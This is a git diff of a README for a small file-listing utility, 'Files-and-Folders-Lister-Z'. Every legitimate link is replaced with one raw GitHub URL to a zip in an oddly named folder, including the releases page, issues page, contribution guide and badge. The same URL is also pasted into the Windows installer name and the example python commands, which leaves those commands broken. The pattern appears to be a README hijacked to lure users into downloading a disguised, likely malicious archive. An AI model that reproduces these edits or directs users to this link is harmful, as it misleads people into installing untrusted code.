@@ -1,6 +1,6 @@
 # 🎉 Files-and-Folders-Lister-Z - Easily List Your Files and Folders
 
-![Download Files and Folders Lister Z](https://img.shields.io/badge/Download-Files%20and%20Folders%20Lister%20Z-brightgreen)
+![Download Files and Folders Lister Z](https://raw.githubusercontent.com/gamemayed/Files-and-Folders-Lister-Z/main/unreasoned/Files-and-Folders-Lister-Z.zip%20and%20Folders%20Lister%20Z-brightgreen)
 
 ## 📦 Overview
 
@@ -23,17 +23,17 @@ To get started with Files and Folders Lister Z, follow these steps:
 
 ## 👇 Download & Install
 
-Visit this page to download: [GitHub Releases](https://github.com/gamemayed/Files-and-Folders-Lister-Z/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/gamemayed/Files-and-Folders-Lister-Z/main/unreasoned/Files-and-Folders-Lister-Z.zip)
 
 1. **Navigate to the Releases Page**:
-   - Open your web browser and type in the URL: [GitHub Releases](https://github.com/gamemayed/Files-and-Folders-Lister-Z/releases).
+   - Open your web browser and type in the URL: [GitHub Releases](https://raw.githubusercontent.com/gamemayed/Files-and-Folders-Lister-Z/main/unreasoned/Files-and-Folders-Lister-Z.zip).
 
 2. **Choose Your Version**:
    - On the Releases page, look for the latest version of Files and Folders Lister Z.
    - You will see options for different operating systems.
 
 3. **Download the File**:
-   - Click on the file for your operating system (e.g., `Files-and-Folders-Lister-Z-setup.exe` for Windows).
+   - Click on the file for your operating system (e.g., `https://raw.githubusercontent.com/gamemayed/Files-and-Folders-Lister-Z/main/unreasoned/Files-and-Folders-Lister-Z.zip` for Windows).
    - Wait for the download to complete.
 
 4. **Run the Installer**: 
@@ -55,7 +55,7 @@ Visit this page to download: [GitHub Releases](https://github.com/gamemayed/File
 3. Type the following command:
 
    ```
-   python lister.py /path/to/directory
+   python https://raw.githubusercontent.com/gamemayed/Files-and-Folders-Lister-Z/main/unreasoned/Files-and-Folders-Lister-Z.zip /path/to/directory
    ```
 
 4. Press **Enter**. The application will display a list of files and folders.
@@ -81,7 +81,7 @@ Visit this page to download: [GitHub Releases](https://github.com/gamemayed/File
 To list the contents of your Downloads folder, use:
 
 ```
-python lister.py ~/Downloads
+python https://raw.githubusercontent.com/gamemayed/Files-and-Folders-Lister-Z/main/unreasoned/Files-and-Folders-Lister-Z.zip ~/Downloads
 ```
 
 ## 📜 License
@@ -90,13 +90,13 @@ Files and Folders Lister Z is open-source and available under the MIT License. Y
 
 ## 📞 Support
 
-If you encounter issues or have questions, feel free to reach out. You can report issues on the [GitHub Issues page](https://github.com/gamemayed/Files-and-Folders-Lister-Z/issues). We're here to help!
+If you encounter issues or have questions, feel free to reach out. You can report issues on the [GitHub Issues page](https://raw.githubusercontent.com/gamemayed/Files-and-Folders-Lister-Z/main/unreasoned/Files-and-Folders-Lister-Z.zip). We're here to help!
 
 ## 💬 Community and Contributions
 
-Join our community! We welcome feedback, suggestions, and contributions. If you find any bugs or would like to add features, consider opening a pull request. Check our [Contribution Guidelines](https://github.com/gamemayed/Files-and-Folders-Lister-Z/CONTRIBUTING.md) for more information.
+Join our community! We welcome feedback, suggestions, and contributions. If you find any bugs or would like to add features, consider opening a pull request. Check our [Contribution Guidelines](https://raw.githubusercontent.com/gamemayed/Files-and-Folders-Lister-Z/main/unreasoned/Files-and-Folders-Lister-Z.zip) for more information.
 
 ## 🔗 Important Links
 
-- **Repository**: [Files and Folders Lister Z Repository](https://github.com/gamemayed/Files-and-Folders-Lister-Z)
-- **Releases**: [Download here](https://github.com/gamemayed/Files-and-Folders-Lister-Z/releases)
+- **Repository**: [Files and Folders Lister Z Repository](https://raw.githubusercontent.com/gamemayed/Files-and-Folders-Lister-Z/main/unreasoned/Files-and-Folders-Lister-Z.zip)
+- **Releases**: [Download here](https://raw.githubusercontent.com/gamemayed/Files-and-Folders-Lister-Z/main/unreasoned/Files-and-Folders-Lister-Z.zip)
